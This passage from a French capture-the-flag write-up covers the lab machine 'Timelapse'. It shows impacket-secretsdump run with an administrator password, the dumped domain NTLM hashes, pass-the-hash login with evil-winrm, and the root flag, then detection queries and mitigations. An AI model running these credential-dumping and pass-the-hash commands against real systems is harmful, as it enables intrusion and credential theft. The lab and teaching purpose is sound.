+</span></span><span style="display:flex;"><span>Directory<span style="color:#960050;background-color:#1e0010">:</span> C:\Users\TRX\Desktop  <span style="color:#960050;background-color:#1e0010">⬅</span>️ Utilisateur TRX !
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Mode                LastWriteTime         Length Name
+</span></span><span style="display:flex;"><span>----                -------------         ------ ----
+</span></span><span style="display:flex;"><span>-ar---       <span style="color:#ae81ff">12</span>/<span style="color:#ae81ff">13</span>/<span style="color:#ae81ff">2025</span>   <span style="color:#ae81ff">6</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">57</span> PM             <span style="color:#ae81ff">34</span> root.txt
+</span></span></code></pre></div><p><strong>🤔 Découverte Surprenante :</strong> Le root flag est dans le profil de <strong>TRX</strong>, pas d&rsquo;Administrator !</p>
+<h3 id="-problème-daccès">❌ Problème d&rsquo;Accès<a hidden class="anchor" aria-hidden="true" href="#-problème-daccès">#</a></h3>
+<p><strong>Tentative de lecture directe :</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>*Evil-WinRM* PS&gt; type C:\Users\TRX\Desktop\root.txt
+</span></span><span style="display:flex;"><span>type <span style="color:#960050;background-color:#1e0010">:</span> Access to the path <span style="color:#e6db74">&#39;C:\Users\TRX\Desktop&#39;</span> is denied.
+</span></span><span style="display:flex;"><span>At line<span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">1</span> char<span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>+ type C:\Users\TRX\Desktop\root.txt
+</span></span><span style="display:flex;"><span>+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+</span></span><span style="display:flex;"><span>    + CategoryInfo          <span style="color:#960050;background-color:#1e0010">:</span> PermissionDenied<span style="color:#960050;background-color:#1e0010">:</span> (C:\Users\TRX\Desktop<span style="color:#960050;background-color:#1e0010">:</span>String)
+</span></span><span style="display:flex;"><span>    + FullyQualifiedErrorId <span style="color:#960050;background-color:#1e0010">:</span> GetContentReaderUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetContentCommand
+</span></span></code></pre></div><p><strong>Analyse des ACLs :</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>*Evil-WinRM* PS&gt; Get-Acl C:\Users\TRX\Desktop | Format-List
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Path   <span style="color:#960050;background-color:#1e0010">:</span> Microsoft.PowerShell.Core\FileSystem::C:\Users\TRX\Desktop
+</span></span><span style="display:flex;"><span>Owner  <span style="color:#960050;background-color:#1e0010">:</span> TIMELAPSE\TRX  <span style="color:#960050;background-color:#1e0010">⬅</span>️ Propriétaire <span style="color:#960050;background-color:#1e0010">:</span> TRX
+</span></span><span style="display:flex;"><span>Access <span style="color:#960050;background-color:#1e0010">:</span> TIMELAPSE\TRX Allow  FullControl  <span style="color:#960050;background-color:#1e0010">⬅</span>️ Seul TRX a accès !
+</span></span><span style="display:flex;"><span>         NT AUTHORITY\SYSTEM Allow  FullControl
+</span></span><span style="display:flex;"><span>         BUILTIN\Administrators Allow  ReadAndExecute, Synchronize  <span style="color:#960050;background-color:#1e0010">⬅</span>️ Admins en lecture seulement !
+</span></span></code></pre></div><p><strong>🎓 Explication :</strong></p>
+<p>Même en tant qu&rsquo;<strong>Administrator du domaine</strong>, les <strong>ACLs NTFS</strong> (permissions fichiers) peuvent restreindre l&rsquo;accès.</p>
+<p><strong>Options :</strong></p>
+<ol>
+<li>✅ Modifier les ACLs (mais risque de détection)</li>
+<li>✅ Se connecter en tant que TRX (Pass-the-Hash)</li>
+<li>❌ Forcer l&rsquo;accès (peut corrompre le système)</li>
+</ol>
+<p><strong>Décision :</strong> Utiliser <strong>secretsdump</strong> pour obtenir le hash de TRX, puis <strong>Pass-the-Hash</strong>.</p>
+<hr>
+<h2 id="8-post-exploitation---secretsdump">8️⃣ POST-EXPLOITATION - SECRETSDUMP<a hidden class="anchor" aria-hidden="true" href="#8-post-exploitation---secretsdump">#</a></h2>
+<h3 id="-quest-ce-que-secretsdump-">🎓 Qu&rsquo;est-ce que secretsdump ?<a hidden class="anchor" aria-hidden="true" href="#-quest-ce-que-secretsdump-">#</a></h3>
+<p><strong>impacket-secretsdump</strong> est un outil Python qui extrait les <strong>secrets</strong> d&rsquo;un système Windows :</p>
+<p><strong>Secrets extraits :</strong></p>
+<table>
+<thead>
+<tr>
+<th>Type</th>
+<th>Description</th>
+<th>Usage Offensif</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>SAM</strong></td>
+<td>Hashes locaux (users locaux)</td>
+<td>Pass-the-Hash local</td>
+</tr>
+<tr>
+<td><strong>LSA Secrets</strong></td>
+<td>Credentials stockés (services, tâches planifiées)</td>
+<td>Mouvement latéral</td>
+</tr>
+<tr>
+<td><strong>NTDS.dit</strong></td>
+<td>Base de données AD (tous les users du domaine)</td>
+<td>Pass-the-Hash, Golden Ticket</td>
+</tr>
+<tr>
+<td><strong>Cached Credentials</strong></td>
+<td>Hashes domain users (offline logon)</td>
+<td>Cracking offline</td>
+</tr>
+<tr>
+<td><strong>DPAPI MasterKeys</strong></td>
+<td>Clés de déchiffrement DPAPI</td>
+<td>Déchiffrer credentials stockés</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Méthodes d&rsquo;extraction :</strong></p>
+<ol>
+<li>
+<p><strong>Via réseau (RPC/SMB)</strong> ← Méthode utilisée ici</p>
+<ul>
+<li>Nécessite credentials admin</li>
+<li>Pas besoin d&rsquo;exécution de code</li>
+</ul>
+</li>
+<li>
+<p><strong>Local (fichiers SYSTEM/SAM/NTDS.dit)</strong></p>
+<ul>
+<li>Nécessite accès aux fichiers système</li>
+<li>Volume Shadow Copy souvent utilisé</li>
+</ul>
+</li>
+</ol>
+<h3 id="-dump-des-secrets">💾 Dump des Secrets<a hidden class="anchor" aria-hidden="true" href="#-dump-des-secrets">#</a></h3>
+<p><strong>Commande :</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>impacket-secretsdump <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  Administrator:<span style="color:#e6db74">&#39;I)}73pmp{9+;E2/kWv0LZ7Tt&#39;</span>@10.10.11.152
+</span></span></code></pre></div><p><strong>Résultat (extrait) :</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>Impacket v0.11.0 - Copyright 2023 Fortra
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>[*] Service RemoteRegistry is in stopped state
+</span></span><span style="display:flex;"><span>[*] Starting service RemoteRegistry
+</span></span><span style="display:flex;"><span>[*] Target system bootKey: 0x0c0e91e0c81bad9d5dac0c4cc5c5b4a3
+</span></span><span style="display:flex;"><span>[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+</span></span><span style="display:flex;"><span>Administrator:500:aad3b435b51404eeaad3b435b51404ee:22d04d77cc32a59f9fe6701aa9ffafb0:::
+</span></span><span style="display:flex;"><span>Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+</span></span><span style="display:flex;"><span>DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>[*] Dumping Domain Credentials (NTDS.dit)
+</span></span><span style="display:flex;"><span>[*] Using the DRSUAPI method to get NTDS.DIT secrets
+</span></span><span style="display:flex;"><span>Administrator:500:aad3b435b51404eeaad3b435b51404ee:22d04d77cc32a59f9fe6701aa9ffafb0:::
+</span></span><span style="display:flex;"><span>Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+</span></span><span style="display:flex;"><span>krbtgt:502:aad3b435b51404eeaad3b435b51404ee:2960d580f05cd511b3da3d3663f3cb37:::
+</span></span><span style="display:flex;"><span>timelapse.htb\legacyy:1603:aad3b435b51404eeaad3b435b51404ee:93da975bcea111839cc584f2f528d63e:::
+</span></span><span style="display:flex;"><span>timelapse.htb\payl0ad:2601:aad3b435b51404eeaad3b435b51404ee:51bcc0dd5ad8d7d06e6e1438e99a83f8:::
+</span></span><span style="display:flex;"><span>timelapse.htb\svc_deploy:3103:aad3b435b51404eeaad3b435b51404ee:c912f3533b7114980dd7b6094be1a9d8:::
+</span></span><span style="display:flex;"><span>timelapse.htb\TRX:5101:aad3b435b51404eeaad3b435b51404ee:4c7121d35cd421cbbd3e44ce83bc923e:::  ⭐
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>[*] Kerberos keys grabbed
+</span></span><span style="display:flex;"><span>timelapse.htb\Administrator:aes256-cts-hmac-sha1-96:184a90b3...
+</span></span><span style="display:flex;"><span>timelapse.htb\Administrator:aes128-cts-hmac-sha1-96:7b984a6...
+</span></span><span style="display:flex;"><span>timelapse.htb\Administrator:des-cbc-md5:6e035f9...
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>[*] Cleaning up...
+</span></span><span style="display:flex;"><span>[*] Stopping service RemoteRegistry
+</span></span></code></pre></div><h3 id="-tableau-récapitulatif-des-hashes">📊 Tableau Récapitulatif des Hashes<a hidden class="anchor" aria-hidden="true" href="#-tableau-récapitulatif-des-hashes">#</a></h3>
+<table>
+<thead>
+<tr>
+<th>Utilisateur</th>
+<th>RID</th>
+<th>Hash LM</th>
+<th>Hash NTLM</th>
+<th>Rôle</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Administrator</strong></td>
+<td>500</td>
+<td>aad3b435b51404eeaad3b435b51404ee</td>
+<td>22d04d77cc32a59f9fe6701aa9ffafb0</td>
+<td>Domain Admin</td>
+</tr>
+<tr>
+<td>Guest</td>
+<td>501</td>
+<td>aad3b435b51404eeaad3b435b51404ee</td>
+<td>31d6cfe0d16ae931b73c59d7e0c089c0</td>
+<td>Compte désactivé</td>
+</tr>
+<tr>
+<td><strong>krbtgt</strong></td>
+<td>502</td>
+<td>aad3b435b51404eeaad3b435b51404ee</td>
+<td>2960d580f05cd511b3da3d3663f3cb37</td>
+<td>Service account Kerberos</td>
+</tr>
+<tr>
+<td>legacyy</td>
+<td>1603</td>
+<td>aad3b435b51404eeaad3b435b51404ee</td>
+<td>93da975bcea111839cc584f2f528d63e</td>
+<td>User</td>
+</tr>
+<tr>
+<td>payl0ad</td>
+<td>2601</td>
+<td>aad3b435b51404eeaad3b435b51404ee</td>
+<td>51bcc0dd5ad8d7d06e6e1438e99a83f8</td>
+<td>User</td>
+</tr>
+<tr>
+<td>svc_deploy</td>
+<td>3103</td>
+<td>aad3b435b51404eeaad3b435b51404ee</td>
+<td>c912f3533b7114980dd7b6094be1a9d8</td>
+<td>User (LAPS_Readers)</td>
+</tr>
+<tr>
+<td><strong>TRX</strong></td>
+<td>5101</td>
+<td>aad3b435b51404eeaad3b435b51404ee</td>
+<td><strong>4c7121d35cd421cbbd3e44ce83bc923e</strong></td>
+<td><strong>User (root flag)</strong></td>
+</tr>
+</tbody>
+</table>
+<p><strong>🎓 Note sur Hash LM :</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>aad3b435b51404eeaad3b435b51404ee
+</span></span></code></pre></div><p>Ce hash constant signifie que <strong>LM hashing est désactivé</strong> (bonne pratique de sécurité).</p>
+<h3 id="-pass-the-hash-avec-trx">🎯 Pass-the-Hash avec TRX<a hidden class="anchor" aria-hidden="true" href="#-pass-the-hash-avec-trx">#</a></h3>
+<p><strong>🎓 Technique Pass-the-Hash :</strong></p>
+<p>Au lieu d&rsquo;utiliser un mot de passe en clair, on peut s&rsquo;authentifier directement avec le <strong>hash NTLM</strong>. Cette technique fonctionne car :</p>
+<ol>
+<li>Windows utilise NTLM pour l&rsquo;authentification réseau</li>
+<li>Le hash NTLM est la &ldquo;clé&rdquo; utilisée pour chiffrer les challenges NTLM</li>
+<li>Pas besoin de connaître le mot de passe original !</li>
+</ol>
+<p><strong>Avantages :</strong></p>
+<ul>
+<li>✅ Pas de cracking nécessaire</li>
+<li>✅ Fonctionne même avec mots de passe complexes</li>
+<li>✅ Discret (pas de modification de mot de passe)</li>
+</ul>
+<p><strong>Limitation :</strong></p>
+<ul>
+<li>❌ Ne fonctionne pas avec Kerberos (nécessite le mot de passe ou un ticket)</li>
+<li>❌ Détectable (event ID 4624 avec Logon Type 3)</li>
+</ul>
+<p><strong>Connexion avec Evil-WinRM :</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>evil-winrm <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -i 10.10.11.152 <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -u TRX <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -H 4c7121d35cd421cbbd3e44ce83bc923e <span style="color:#ae81ff">\
+</span></span></span><span style="display:flex;"><span><span style="color:#ae81ff"></span>  -S
+</span></span></code></pre></div><p><strong>Flags :</strong></p>
+<table>
+<thead>
+<tr>
+<th>Flag</th>
+<th>Signification</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>-u</code></td>
+<td>Username</td>
+</tr>
+<tr>
+<td><code>-H</code></td>
+<td><strong>Hash NTLM</strong> (au lieu de <code>-p</code> pour password)</td>
+</tr>
+<tr>
+<td><code>-S</code></td>
+<td>SSL activé</td>
+</tr>
+</tbody>
+</table>
+<p><strong>✅ Connexion Réussie !</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>*Evil-WinRM* PS C:\Users\TRX\Documents&gt; whoami
+</span></span><span style="display:flex;"><span>timelapse\trx
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:\Users\TRX\Documents&gt; whoami /groups | Select-String &#34;Admin&#34;
+</span></span><span style="display:flex;"><span># Pas d&#39;admin → Utilisateur standard
+</span></span></code></pre></div><h3 id="-root-flag">🏁 Root Flag<a hidden class="anchor" aria-hidden="true" href="#-root-flag">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>*Evil-WinRM* PS C:\Users\TRX\Documents&gt; cd ..\Desktop
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:\Users\TRX\Desktop&gt; dir
+</span></span><span style="display:flex;"><span>    Directory<span style="color:#960050;background-color:#1e0010">:</span> C:\Users\TRX\Desktop
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Mode                LastWriteTime         Length Name
+</span></span><span style="display:flex;"><span>----                -------------         ------ ----
+</span></span><span style="display:flex;"><span>-ar---       <span style="color:#ae81ff">12</span>/<span style="color:#ae81ff">13</span>/<span style="color:#ae81ff">2025</span>   <span style="color:#ae81ff">6</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">57</span> PM             <span style="color:#ae81ff">34</span> root.txt
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>*Evil-WinRM* PS C:\Users\TRX\Desktop&gt; type root.txt
+</span></span><span style="display:flex;"><span>6506078077b79f2969f0a0a69fe4eddf  <span style="color:#960050;background-color:#1e0010">⭐</span> ROOT FLAG
+</span></span></code></pre></div><hr>
+<h2 id="9-détection--mitigation">9️⃣ DÉTECTION &amp; MITIGATION<a hidden class="anchor" aria-hidden="true" href="#9-détection--mitigation">#</a></h2>
+<h3 id="-détection-smb-anonymous-access">🛡️ Détection SMB Anonymous Access<a hidden class="anchor" aria-hidden="true" href="#-détection-smb-anonymous-access">#</a></h3>
+<p><strong>Event IDs Windows :</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># Event ID 4624 - Logon réussi avec Anonymous Logon</span>
+</span></span><span style="display:flex;"><span>Get-WinEvent -LogName Security | Where-Object {
+</span></span><span style="display:flex;"><span>    $_.Id <span style="color:#f92672">-eq</span> <span style="color:#ae81ff">4624</span> <span style="color:#f92672">-and</span>
+</span></span><span style="display:flex;"><span>    $_.Properties[<span style="color:#ae81ff">5</span>].Value <span style="color:#f92672">-eq</span> <span style="color:#e6db74">&#34;3&#34;</span> <span style="color:#f92672">-and</span>  <span style="color:#75715e"># Logon Type = Network</span>
+</span></span><span style="display:flex;"><span>    $_.Properties[<span style="color:#ae81ff">8</span>].Value <span style="color:#f92672">-match</span> <span style="color:#e6db74">&#34;ANONYMOUS&#34;</span>
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Event ID 5140 - Partage réseau accédé</span>
+</span></span><span style="display:flex;"><span>Get-WinEvent -LogName Security | Where-Object {
+</span></span><span style="display:flex;"><span>    $_.Id <span style="color:#f92672">-eq</span> <span style="color:#ae81ff">5140</span> <span style="color:#f92672">-and</span>
+</span></span><span style="display:flex;"><span>    $_.Message <span style="color:#f92672">-match</span> <span style="color:#e6db74">&#34;\\\\Shares&#34;</span>
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p><strong>Mitigations :</strong></p>
+<ol>
+<li><strong>Désactiver accès anonyme :</strong></li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># Via GPO : Computer Configuration → Windows Settings → Security Settings</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># → Local Policies → Security Options</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># → Network access: Do not allow anonymous enumeration of SAM accounts and shares = Enabled</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Via Registre</span>
+</span></span><span style="display:flex;"><span>Set-ItemProperty -Path <span style="color:#e6db74">&#34;HKLM:\SYSTEM\CurrentControlSet\Control\Lsa&#34;</span> -Name <span style="color:#e6db74">&#34;RestrictAnonymous&#34;</span> -Value <span style="color:#ae81ff">1</span>
+</span></span></code></pre></div><ol start="2">
+<li><strong>Désactiver SMBv1 (vulnérable) :</strong></li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>Set-SmbServerConfiguration -EnableSMB1Protocol $false -Force
+</span></span></code></pre></div><ol start="3">
+<li><strong>Exiger signature SMB :</strong></li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>Set-SmbServerConfiguration -RequireSecuritySignature $true -Force
+</span></span></code></pre></div><ol start="4">
+<li><strong>Auditer accès aux partages :</strong></li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># Activer l&#39;audit d&#39;accès aux objets</span>
+</span></span><span style="display:flex;"><span>auditpol /set /subcategory<span style="color:#960050;background-color:#1e0010">:</span><span style="color:#e6db74">&#34;File Share&#34;</span> /success<span style="color:#960050;background-color:#1e0010">:</span>enable /failure<span style="color:#960050;background-color:#1e0010">:</span>enable
+</span></span></code></pre></div><h3 id="-détection-cracking-de-fichiers">🛡️ Détection Cracking de Fichiers<a hidden class="anchor" aria-hidden="true" href="#-détection-cracking-de-fichiers">#</a></h3>
+<p><strong>Event IDs :</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># Event ID 4663 - Tentative d&#39;accès à un objet</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Surveillance des fichiers .zip, .pfx téléchargés</span>
+</span></span><span style="display:flex;"><span>Get-WinEvent -LogName Security | Where-Object {
+</span></span><span style="display:flex;"><span>    $_.Id <span style="color:#f92672">-eq</span> <span style="color:#ae81ff">4663</span> <span style="color:#f92672">-and</span>
+</span></span><span style="display:flex;"><span>    ($_.Message <span style="color:#f92672">-match</span> <span style="color:#e6db74">&#34;\.zip&#34;</span> <span style="color:#f92672">-or</span> $_.Message <span style="color:#f92672">-match</span> <span style="color:#e6db74">&#34;\.pfx&#34;</span>)
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p><strong>Mitigations :</strong></p>
+<ol>
+<li><strong>Mots de passe forts (20+ caractères) :</strong></li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># Politique de mot de passe pour archives</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Utiliser gestionnaire de mots de passe (KeePass, 1Password, etc.)</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Exemple : &#34;Correct-Horse-Battery-Staple-2025!@#$&#34;</span>
+</span></span></code></pre></div><ol start="2">
+<li><strong>Chiffrement des fichiers sensibles :</strong></li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># Utiliser EFS ou BitLocker</span>
+</span></span><span style="display:flex;"><span>cipher /e C:\SensitiveFiles
+</span></span></code></pre></div><ol start="3">
+<li><strong>DLP (Data Loss Prevention) :</strong>
+<ul>
+<li>Bloquer upload de fichiers .pfx/.p12 sur partages</li>
+<li>Scanner les fichiers pour credentials hardcodés</li>
+</ul>
+</li>
+</ol>
+<h3 id="-détection-winrm-certificate-auth">🛡️ Détection WinRM Certificate Auth<a hidden class="anchor" aria-hidden="true" href="#-détection-winrm-certificate-auth">#</a></h3>
+<p><strong>Event IDs :</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># Event ID 4624 - Logon via certificat</span>
+</span></span><span style="display:flex;"><span>Get-WinEvent -LogName Security | Where-Object {
+</span></span><span style="display:flex;"><span>    $_.Id <span style="color:#f92672">-eq</span> <span style="color:#ae81ff">4624</span> <span style="color:#f92672">-and</span>
+</span></span><span style="display:flex;"><span>    $_.Properties[<span style="color:#ae81ff">10</span>].Value <span style="color:#f92672">-eq</span> <span style="color:#e6db74">&#34;3&#34;</span> <span style="color:#f92672">-and</span>  <span style="color:#75715e"># Logon Type = Network</span>
+</span></span><span style="display:flex;"><span>    $_.Message <span style="color:#f92672">-match</span> <span style="color:#e6db74">&#34;Certificate&#34;</span>
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Event ID 4648 - Logon avec credentials explicites</span>
+</span></span><span style="display:flex;"><span>Get-WinEvent -LogName Security | Where-Object {
+</span></span><span style="display:flex;"><span>    $_.Id <span style="color:#f92672">-eq</span> <span style="color:#ae81ff">4648</span>
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Logs WinRM spécifiques</span>
+</span></span><span style="display:flex;"><span>Get-WinEvent -LogName <span style="color:#e6db74">&#34;Microsoft-Windows-WinRM/Operational&#34;</span> | Where-Object {
+</span></span><span style="display:flex;"><span>    $_.Message <span style="color:#f92672">-match</span> <span style="color:#e6db74">&#34;Certificate&#34;</span>
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p><strong>Mitigations :</strong></p>
+<ol>
+<li><strong>Restreindre WinRM :</strong></li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># Limiter les IPs autorisées</span>
+</span></span><span style="display:flex;"><span>Set-Item WSMan<span style="color:#960050;background-color:#1e0010">:</span>\localhost\Client\TrustedHosts -Value <span style="color:#e6db74">&#34;10.10.10.0/24&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Désactiver WinRM si non nécessaire</span>
+</span></span><span style="display:flex;"><span>Stop-Service WinRM
+</span></span><span style="display:flex;"><span>Set-Service WinRM -StartupType Disabled
+</span></span></code></pre></div><ol start="2">
+<li>
+<p><strong>Authentification multi-facteurs (MFA) :</strong></p>
+<ul>
+<li>Utiliser Smart Cards au lieu de certificats simples</li>
+<li>Implémenter Conditional Access (Azure AD)</li>
+</ul>
+</li>
+<li>
+<p><strong>Certificate Revocation Lists (CRL) :</strong></p>
+</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># Forcer vérification CRL</span>
+</span></span><span style="display:flex;"><span>Set-Item WSMan<span style="color:#960050;background-color:#1e0010">:</span>\localhost\Service\Auth\Certificate -Value $true
+</span></span></code></pre></div><h3 id="-détection-powershell-history-dumping">🛡️ Détection PowerShell History Dumping<a hidden class="anchor" aria-hidden="true" href="#-détection-powershell-history-dumping">#</a></h3>
+<p><strong>Event IDs :</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># Event ID 4663 - Accès au fichier ConsoleHost_history.txt</span>
+</span></span><span style="display:flex;"><span>Get-WinEvent -LogName Security | Where-Object {
+</span></span><span style="display:flex;"><span>    $_.Id <span style="color:#f92672">-eq</span> <span style="color:#ae81ff">4663</span> <span style="color:#f92672">-and</span>
+</span></span><span style="display:flex;"><span>    $_.Message <span style="color:#f92672">-match</span> <span style="color:#e6db74">&#34;ConsoleHost_history.txt&#34;</span>
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Script Block Logging (Event ID 4104)</span>
+</span></span><span style="display:flex;"><span>Get-WinEvent -LogName <span style="color:#e6db74">&#34;Microsoft-Windows-PowerShell/Operational&#34;</span> | Where-Object {
+</span></span><span style="display:flex;"><span>    $_.Id <span style="color:#f92672">-eq</span> <span style="color:#ae81ff">4104</span> <span style="color:#f92672">-and</span>
+</span></span><span style="display:flex;"><span>    $_.Message <span style="color:#f92672">-match</span> <span style="color:#e6db74">&#34;ConsoleHost_history&#34;</span>
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p><strong>Mitigations Critiques :</strong></p>
+<ol>
+<li><strong>❌ NE JAMAIS mettre de credentials en clair dans des scripts :</strong></li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span><span style="color:#75715e"># ❌ MAUVAIS</span>
+</span></span><span style="display:flex;"><span>$password = <span style="color:#e6db74">&#34;MyP@ssw0rd123!&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># ✅ BON - Utiliser Get-Credential</span>
+</span></span><span style="display:flex;"><span>$creds = Get-Credential
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># ✅ BON - Utiliser DPAPI pour stockage sécurisé</span>
+</span></span><span style="display:flex;"><span>$securePass = Read-Host -AsSecureString <span style="color:#e6db74">&#34;Enter password&#34;</span>
+</span></span><span style="display:flex;"><span>$encrypted = $securePass | ConvertFrom-SecureString
